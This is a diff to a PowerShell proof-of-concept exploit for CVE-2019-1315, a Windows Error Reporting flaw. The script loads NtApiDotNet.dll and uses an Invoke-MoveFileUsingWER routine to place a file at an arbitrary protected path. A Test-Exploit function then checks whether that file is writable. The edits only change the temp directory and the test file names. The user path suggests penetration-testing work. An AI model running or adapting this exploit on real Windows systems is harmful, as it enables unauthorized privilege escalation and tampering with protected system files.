@@ -1,6 +1,6 @@
 Import-Module "C:\Users\cnpentester1\Downloads\CVE-2019-1315-master\NtApiDotNet.dll" -ErrorAction Stop
 
-$TempReportDir = "C:\Users\cnpentester1\Downloads\CVE-2019-1315-master"
+$TempReportDir = "$env:SystemRoot\Temp\RQ"
 
 function Invoke-MoveFileUsingWER($Source, $Destination) {
     Write-Host "Setting up dirs & files..."
@@ -67,14 +67,14 @@ function Test-Exploit($TargetFile) {
         Write-Warning "Target file already exists, exiting"
         return
     }
-    New-Item -Type File -Path "$env:SystemRoot\Temp\testfile" -Value "test" -ErrorAction Stop | Out-Null
-    Invoke-MoveFileUsingWER -Source "$env:SystemRoot\Temp\testfile" -Destination $TargetFile
+    New-Item -Type File -Path "$env:SystemRoot\Temp\testfile1" -Value "test" -ErrorAction Stop | Out-Null
+    Invoke-MoveFileUsingWER -Source "$env:SystemRoot\Temp\testfile1" -Destination $TargetFile
 
     if (Test-IsFileWritable($TargetFile)) {
         Write-Host -ForegroundColor Green "File $TargetFile successfully created!"
         Get-Item $TargetFile
     } else {
         Write-Warning "File not created or not writable."
-        Remove-Item -Path "$env:SystemRoot\Temp\testfile" -Force -ErrorAction SilentlyContinue
+        Remove-Item -Path "$env:SystemRoot\Temp\testfile1" -Force -ErrorAction SilentlyContinue
     }
 }
